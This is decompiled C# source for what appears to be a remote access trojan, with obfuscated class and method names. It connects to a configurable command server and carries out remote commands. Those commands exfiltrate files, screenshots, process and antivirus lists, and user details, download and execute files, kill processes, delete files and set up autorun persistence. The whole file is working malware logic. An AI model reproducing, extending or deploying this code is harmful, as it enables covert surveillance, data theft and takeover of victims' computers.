using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace rgocrwse;

public class ortmirdsMCDM
{
	public NetworkStream ortmirdsnetStream;

	private int ortmirdsbuffSize = 1024;

	private ortmirdsDRIVF ortmirdsHD = new ortmirdsDRIVF();

	public bool ortmirdsis_working = false;

	private bool ortmirdsiswitch = false;

	public int port_sn = 0;

	private Dictionary<string, byte[]> ortmirdstasks = new Dictionary<string, byte[]>();

	public DateTime ortmirdsrunTime;

	private int ortmirdsbytesRead = 0;

	public bool ortmirdsreqCnls = false;

	private int ortmirdsatmps = 0;

	public bool ortmirdsautCnls = false;

	public DateTime ortmirdslTimeUtc;

	private ortmirdsTHRE ortmirdsStateObj = new ortmirdsTHRE();

	private ortmirdsMYINF ortmirdsUPC;

	private ortmirdsOCMD ortmirdsCMD;

	private int ortmirdsscrSize = 200;

	private ThreadStart ortmirdsfunStarter;

	public TcpClient ortmirdstcpsck;

	private bool ortmirdsthrRuning = false;

	private int ortmirdsthreadCnts = 0;

	private bool ortmirdsstr_writer = false;

	private bool ortmirdscapScreen = false;

	private Thread ortmirdsfunThread;

	public void ortmirdsdo_start()
	{
		ortmirdsCONF.ortmirdsport = ortmirdsCONF.ports[0];
		ortmirdsrunTime = DateTime.Now;
		ortmirdsUPC = new ortmirdsMYINF();
		ortmirdsCMD = new ortmirdsOCMD(this);
		ortmirdsHD.iserver = this;
		ortmirdsHD.ortmirdsmainPath = ortmirdsCONF.ortmirdsget_mpath();
		TimerCallback callback = ortmirdslookup_connect;
		Timer ortmirdstimer = new Timer(callback, ortmirdsStateObj, 32110, 36110);
		ortmirdsStateObj.ortmirdstimer = ortmirdstimer;
	}

	private void ortmirdscheckLastatime(DateTime mTimeUtc)
	{
		try
		{
			int num = Math.Abs(ortmirdsrunTime.Subtract(mTimeUtc).Minutes);
			if (num > 5)
			{
				ortmirdstcpsck.Close();
				ortmirdsis_working = false;
			}
		}
		catch
		{
		}
	}

	public void ortmirdssaveFile(string filePath, string run)
	{
		try
		{
			byte[] array = ortmirdspull_data();
			if (array != null)
			{
				File.WriteAllBytes(filePath, array);
			}
		}
		catch
		{
		}
	}

	public string ortmirdsfile_info(string path, bool ret = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ((!ret) ? ">|ortmirds".Split(new char[1] { '|' })[0] : "<|ortmirds".Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.Date.ToString() + ((!ret) ? ">|ortmirds".Split(new char[1] { '|' })[0] : "<|ortmirds".Split(new char[1] { '|' })[0]);
			text = text + ortmirdsget_size(fileInfo.Length) + ((!ret) ? ">|ortmirds".Split(new char[1] { '|' })[0] : "<|ortmirds".Split(new char[1] { '|' })[0]);
			if (!ret)
			{
				ortmirdspush_data(null, "ortmirds-filsz=|ortmirds".Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	private void ortmirdslookup_connect(object source)
	{
		try
		{
			if (!ortmirdsthrRuning)
			{
				ortmirdsthrRuning = true;
				ortmirdscheckLastatime(DateTime.Now);
				if (!ortmirdsis_working || !ortmirdstcpsck.Connected)
				{
					ortmirdsis_working = ortmirdsIPSConfig();
					if (ortmirdsis_working)
					{
						ortmirdsbuffSize = ortmirdstcpsck.ReceiveBufferSize;
						ortmirdssee_responce();
					}
				}
			}
			else
			{
				ortmirdsthreadCnts++;
			}
			ortmirdsthrRuning = false;
		}
		catch
		{
			ortmirdsatmps++;
			ortmirdsthrRuning = false;
			ortmirdsthreadCnts = 0;
			ortmirdsstr_writer = false;
			ortmirdsis_working = false;
			ortmirdsiswitch = false;
		}
	}

	private bool ortmirdsIPSConfig()
	{
		try
		{
			ortmirdsCONF.ortmirdsdefaultP = ortmirdsCMD.ortmirdsserverIPD()[0];
			if (ortmirdsatmps > 20)
			{
				ortmirdsCONF.ortmirdsdefaultP = ortmirdsCMD.ortmirdsserverIPD()[1];
				if (ortmirdsatmps > 34)
				{
					ortmirdsatmps = 0;
				}
			}
			ortmirdsatmps++;
			ortmirdstcpsck = new TcpClient();
			ortmirdstcpsck.Connect(ortmirdsCONF.ortmirdsdefaultP, ortmirdsCONF.ortmirdsport);
			return true;
		}
		catch
		{
			ortmirdsports_switch();
			return false;
		}
	}

	public void ortmirdsports_switch()
	{
		try
		{
			port_sn++;
			ortmirdsCONF.ortmirdsport = ortmirdsCONF.ports[port_sn];
			if (port_sn >= ortmirdsCONF.ports.Length - 1)
			{
				port_sn = 0;
			}
		}
		catch
		{
			port_sn = 0;
		}
	}

	public bool ortmirdssend_auto(string fileinfo)
	{
		try
		{
			string[] array = fileinfo.Split(new char[1] { '>' });
			string path = array[0];
			if (File.Exists(path))
			{
				string fileName = Path.GetFileName(path);
				byte[] data = File.ReadAllBytes(path);
				fileinfo = fileinfo + ">" + fileName;
				ortmirdspush_data(data, "ortmirds-afile=" + fileinfo);
				return false;
			}
			ortmirdspush_data(null, "ortmirds-anfod=" + fileinfo);
			return false;
		}
		catch
		{
			return false;
		}
	}

	public void ortmirdslist_processes(string cmd)
	{
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_0077: Expected O, but got Unknown
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				long num = 0L;
				string text2 = "";
				try
				{
					PerformanceCounter val = new PerformanceCounter("Process|ortmirds".Split(new char[1] { '|' })[0], "Working Set - Private|ortmirds".Split(new char[1] { '|' })[0], processes[i].ProcessName);
					num = val.get_RawValue() / 1024L;
					FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(processes[i].MainModule!.FileName);
					text2 = versionInfo.FileDescription;
				}
				catch
				{
				}
				text = text + processes[i].Id + ">|ortmirds".Split(new char[1] { '|' })[0];
				text = text + processes[i].ProcessName + ">|ortmirds".Split(new char[1] { '|' })[0];
				text = text + num + ">|ortmirds".Split(new char[1] { '|' })[0];
				text = text + text2 + "<";
			}
			if (text == "")
			{
				text = "No-Access!> > > <|ortmirds".Split(new char[1] { '|' })[0];
			}
			byte[] bytes = Encoding.UTF8.GetBytes(text);
			ortmirdspush_data(bytes, "ortmirds-" + cmd + "=process|ortmirds".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	public void ortmirdsload_app()
	{
		try
		{
			string executablePath = Application.get_ExecutablePath();
			string text = ortmirdsCONF.ortmirdsget_mpath() + ortmirdsCONF.ortmirdsmainApp + ".exe|ortmirds".Split(new char[1] { '|' })[0];
			if (text != executablePath)
			{
				File.WriteAllBytes(text, File.ReadAllBytes(executablePath));
			}
			Thread.Sleep(10);
			ortmirdsCONF.ortmirdsset_run("mrodr|ortmirds".Split(new char[1] { '|' })[0], ortmirdsCONF.ortmirdsget_mpath() + ortmirdsCONF.ortmirdsmainApp + ".exe|ortmirds".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private void ortmirdsimage_info(string path)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap((Image)new Bitmap(path), new Size(200, 150));
			if (val != null)
			{
				FileInfo fileInfo = new FileInfo(path);
				string text = fileInfo.Name + ">|ortmirds".Split(new char[1] { '|' })[0];
				text = text + fileInfo.CreationTimeUtc.Date.ToString() + ">|ortmirds".Split(new char[1] { '|' })[0];
				text = text + ortmirdsget_size(fileInfo.Length) + ">";
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Gif());
				ortmirdspush_data(memoryStream.ToArray(), "ortmirds-thumb=|ortmirds".Split(new char[1] { '|' })[0] + text);
			}
		}
		catch
		{
		}
	}

	private void ortmirdssee_scren(string screenSize)
	{
		try
		{
			ortmirdsSCRNS ortmirdsSCRNS2 = new ortmirdsSCRNS();
			ortmirdsscrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			Bitmap val = ortmirdsSCRNS2.ortmirdsscreen(ortmirdsscrSize);
			if (val != null)
			{
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				ortmirdspush_data(memoryStream.ToArray(), "ortmirds-sascr=capScreen|ortmirds".Split(new char[1] { '|' })[0]);
			}
		}
		catch
		{
		}
	}

	private void ortmirdsis_screen(string screenSize)
	{
		try
		{
			ortmirdsSCRNS ortmirdsSCRNS2 = new ortmirdsSCRNS();
			ortmirdsscrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			while (ortmirdscapScreen && ortmirdsis_working)
			{
				Bitmap val = ortmirdsSCRNS2.ortmirdsscreen(ortmirdsscrSize);
				if (val != null)
				{
					MemoryStream memoryStream = new MemoryStream();
					((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
					ortmirdspush_data(memoryStream.ToArray(), "ortmirds-scren=capScreen|ortmirds".Split(new char[1] { '|' })[0]);
				}
			}
		}
		catch
		{
		}
	}

	private void ortmirdsuser_info()
	{
		string text = ortmirdsUPC.ortmirdslancard + "|" + ortmirdsUPC.ortmirdscname + "|" + ortmirdsUPC.ortmirdsuname + "|" + ortmirdsUPC.ortmirdsuip + "|" + ortmirdsCONF.ortmirdsOsname() + "|" + ortmirdsUPC.ortmirdsapver + "|";
		text += "| !ortmirds".Split(new char[1] { '!' })[0];
		text = text + "|" + ortmirdsUPC.ortmirdsclientNum;
		text = text + "|" + ortmirdsCONF.ortmirdsget_mpath();
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		ortmirdspush_data(bytes, "ortmirds-info=user|ortmirds".Split(new char[1] { '|' })[0]);
	}

	private void ortmirdsscreenSize(string scSize)
	{
		try
		{
			string[] array = scSize.Split(new char[1] { '>' });
			ortmirdsscrSize = Convert.ToInt16(array[0].Trim());
		}
		catch
		{
		}
	}

	private void ortmirdspush_file(string lfile)
	{
		try
		{
			if (File.Exists(lfile))
			{
				string fileName = Path.GetFileName(lfile);
				if (fileName != "")
				{
					string type = "ortmirds-file=|ortmirds".Split(new char[1] { '|' })[0] + lfile + ">0>" + fileName;
					ortmirdspush_data(File.ReadAllBytes(lfile), type, tmp: true);
				}
			}
		}
		catch
		{
		}
	}

	public void ortmirdsremove_file(string path)
	{
		try
		{
			File.Delete(path);
		}
		catch
		{
		}
	}

	private string ortmirdsget_size(long byteCount)
	{
		try
		{
			string[] array = new string[7]
			{
				"B|ortmirds".Split(new char[1] { '|' })[0],
				"KB|ortmirds".Split(new char[1] { '|' })[0],
				"MB|ortmirds".Split(new char[1] { '|' })[0],
				"GB|ortmirds".Split(new char[1] { '|' })[0],
				"TB|ortmirds".Split(new char[1] { '|' })[0],
				"PB|ortmirds".Split(new char[1] { '|' })[0],
				"EB|ortmirds".Split(new char[1] { '|' })[0]
			};
			if (byteCount == 0L)
			{
				return "0" + array[0];
			}
			long num = Math.Abs(byteCount);
			int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
			double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
			return (double)Math.Sign(byteCount) * num3 + array[num2];
		}
		catch
		{
			return "";
		}
	}

	public string[] ortmirdsget_command()
	{
		try
		{
			byte[] array = new byte[5];
			ortmirdsbytesRead = ortmirdsnetStream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= ortmirdsbytesRead)
			{
				int count = ((num3 > ortmirdsbuffSize) ? ortmirdsbuffSize : num3);
				ortmirdsbytesRead = ortmirdsnetStream.Read(array2, num2, count);
				num2 += ortmirdsbytesRead;
			}
			string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
			if (text.Trim() == "")
			{
				return null;
			}
			return text.Split(new char[1] { '=' });
		}
		catch
		{
			ortmirdsis_working = false;
			return null;
		}
	}

	public byte[] ortmirdspull_data()
	{
		try
		{
			ortmirdsrunTime = DateTime.Now;
			int num = 0;
			byte[] array = new byte[5];
			ortmirdsbytesRead = ortmirdsnetStream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !ortmirdsreqCnls)
			{
				int count = ((num3 > ortmirdsbuffSize) ? ortmirdsbuffSize : num3);
				ortmirdsbytesRead = ortmirdsnetStream.Read(array2, num, count);
				num += ortmirdsbytesRead;
				num3 -= ortmirdsbytesRead;
				ortmirdsrunTime = DateTime.Now;
			}
			if (ortmirdsreqCnls)
			{
				ortmirdsnetStream.Flush();
				while (ortmirdsnetStream.DataAvailable && ortmirdsnetStream.ReadByte() >= 0)
				{
				}
				array2 = null;
			}
			return array2;
		}
		catch
		{
			ortmirdsis_working = false;
			return null;
		}
	}

	private void ortmirdslistDrives()
	{
		string text = ortmirdsHD.ortmirdslookupDrives();
		ortmirdspush_data(null, "ortmirds-dirs=" + text);
	}

	private void ortmirdssee_responce()
	{
		if (!ortmirdsiswitch)
		{
			ortmirdsiswitch = true;
			ortmirdsnetStream = ortmirdsCMD.ortmirdsNS(ortmirdstcpsck);
			ortmirdscapScreen = false;
			while (ortmirdsis_working)
			{
				string[] switchType = ortmirdsget_command();
				if (switchType != null)
				{
					ortmirdsreqCnls = false;
					string text = switchType[0].ToLower();
					text = ((text.Split(new char[1] { '-' }).Length <= 1) ? ("ortmirds-" + text) : ("ortmirds-" + text.Split(new char[1] { '-' })[1]));
					switch (text)
					{
					case "ortmirds-procl":
						ortmirdsfunStarter = delegate
						{
							ortmirdslist_processes("procl");
						};
						ortmirdsfunThread = new Thread(ortmirdsfunStarter);
						ortmirdsfunThread.Start();
						break;
					case "ortmirds-getavs":
						ortmirdsfunStarter = delegate
						{
							ortmirdslist_processes("getavs");
						};
						ortmirdsfunThread = new Thread(ortmirdsfunStarter);
						ortmirdsfunThread.Start();
						break;
					case "ortmirds-thumb":
						ortmirdsimage_info(switchType[1]);
						break;
					case "ortmirds-clping":
						ortmirdsrunTime = DateTime.Now;
						break;
					case "ortmirds-putsrt":
						ortmirdsload_app();
						break;
					case "ortmirds-filsz":
						ortmirdsfunStarter = delegate
						{
							ortmirdsfile_info(switchType[1]);
						};
						ortmirdsfunThread = new Thread(ortmirdsfunStarter);
						ortmirdsfunThread.Start();
						break;
					case "ortmirds-rupth":
						ortmirdspush_data(null, "ortmirds-appth=|ortmirds".Split(new char[1] { '|' })[0] + ortmirdsCONF.ortmirdsget_mpath());
						break;
					case "ortmirds-dowf":
						ortmirdssaveFile(switchType[1], "");
						break;
					case "ortmirds-endpo":
						try
						{
							Thread.Sleep(100);
							try
							{
								Process.GetProcessById(Convert.ToInt16(switchType[1].Trim())).Kill();
							}
							catch
							{
								ortmirdsCMD.ortmirdsdieProcess(Process.GetProcessById(Convert.ToInt16(switchType[1].Trim())));
							}
						}
						catch
						{
						}
						break;
					case "ortmirds-scrsz":
						ortmirdsscreenSize(switchType[1]);
						break;
					case "ortmirds-cownar":
						ortmirdsCMD.ortmirdsdo_updated(7, switchType[1]);
						break;
					case "ortmirds-cscreen":
						ortmirdssee_scren(switchType[1]);
						break;
					case "ortmirds-dirs":
						ortmirdsfunThread = new Thread(ortmirdslistDrives);
						ortmirdsfunThread.Start();
						break;
					case "ortmirds-stops":
						ortmirdscapScreen = false;
						break;
					case "ortmirds-scren":
						ortmirdscapScreen = true;
						ortmirdsfunStarter = delegate
						{
							ortmirdsis_screen(switchType[1]);
						};
						ortmirdsfunThread = new Thread(ortmirdsfunStarter);
						ortmirdsfunThread.Start();
						break;
					case "ortmirds-cnls":
						ortmirdsautCnls = true;
						ortmirdsreqCnls = true;
						ortmirdscapScreen = false;
						break;
					case "ortmirds-udlt":
						ortmirdsCMD.ortmirdsremove_user();
						ortmirdstcpsck.Close();
						break;
					case "ortmirds-delt":
						ortmirdsfunStarter = delegate
						{
							ortmirdsremove_file(switchType[1]);
						};
						ortmirdsfunThread = new Thread(ortmirdsfunStarter);
						ortmirdsfunThread.Start();
						break;
					case "ortmirds-afile":
						ortmirdsfunStarter = delegate
						{
							ortmirdssend_auto(switchType[1]);
						};
						ortmirdsfunThread = new Thread(ortmirdsfunStarter);
						ortmirdsfunThread.Start();
						break;
					case "ortmirds-listf":
						ortmirdsfunStarter = delegate
						{
							ortmirdsHD.ortmirdslookFiles(switchType[1]);
						};
						ortmirdsfunThread = new Thread(ortmirdsfunStarter);
						ortmirdsfunThread.Start();
						break;
					case "ortmirds-file":
						ortmirdsfunStarter = delegate
						{
							ortmirdspush_file(switchType[1]);
						};
						ortmirdsfunThread = new Thread(ortmirdsfunStarter);
						ortmirdsfunThread.Start();
						break;
					case "ortmirds-info":
						ortmirdsfunThread = new Thread(ortmirdsuser_info);
						ortmirdsfunThread.Start();
						break;
					case "ortmirds-runf":
						ortmirdsCMD.ortmirdsdo_process(switchType[1].Split(new char[1] { '>' })[0], switchType[1].Split(new char[1] { '>' })[1], sendExp: true);
						break;
					case "ortmirds-fles":
					{
						string files = ortmirdsHD.ortmirdslookupFiles(switchType[1]);
						if (files != null)
						{
							ortmirdsfunStarter = delegate
							{
								ortmirdspush_data(null, "ortmirds-fles=|ortmirds".Split(new char[1] { '|' })[0] + files);
							};
							ortmirdsfunThread = new Thread(ortmirdsfunStarter);
							ortmirdsfunThread.Start();
						}
						break;
					}
					case "ortmirds-dowr":
						ortmirdssaveFile(switchType[1], "run|ortmirds".Split(new char[1] { '|' })[0]);
						break;
					case "ortmirds-fldr":
					{
						string Folders = ortmirdsHD.ortmirdscheckFolders(switchType[1]);
						if (Folders != null)
						{
							ortmirdsfunStarter = delegate
							{
								ortmirdspush_data(null, "ortmirds-fldr=|ortmirds".Split(new char[1] { '|' })[0] + Folders);
							};
							ortmirdsfunThread = new Thread(ortmirdsfunStarter);
							ortmirdsfunThread.Start();
						}
						break;
					}
					}
					continue;
				}
				ortmirdsis_working = false;
				break;
			}
			ortmirdsis_working = false;
			ortmirdscapScreen = false;
		}
		ortmirdsiswitch = false;
	}

	public bool ortmirdspush_data(byte[] data, string type, bool tmp = false)
	{
		try
		{
			ortmirdsrunTime = DateTime.Now;
			if (ortmirdsstr_writer)
			{
				return false;
			}
			ortmirdsstr_writer = true;
			byte[] bytes = Encoding.UTF8.GetBytes(type);
			int num = 0;
			int num2 = 5;
			byte[] array = null;
			if (data != null)
			{
				array = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes2 = BitConverter.GetBytes(bytes.Length);
			byte[] array2 = new byte[num2 + bytes.Length + num];
			bytes2.CopyTo(array2, 0);
			bytes.CopyTo(array2, 5);
			if (data != null)
			{
				array.CopyTo(array2, 5 + bytes.Length);
				data.CopyTo(array2, 10 + bytes.Length);
			}
			int num3 = 0;
			int num4 = array2.Length;
			while (num4 > 0 && !ortmirdsreqCnls)
			{
				int num5 = ((num4 > ortmirdsbuffSize) ? ortmirdsbuffSize : num4);
				ortmirdsnetStream.Write(array2, num3, num5);
				num3 += num5;
				num4 -= num5;
				ortmirdsrunTime = DateTime.Now;
			}
			ortmirdsstr_writer = false;
			if (ortmirdsreqCnls)
			{
				return false;
			}
			return true;
		}
		catch
		{
			ortmirdsstr_writer = false;
			ortmirdsis_working = false;
			return false;
		}
	}
}
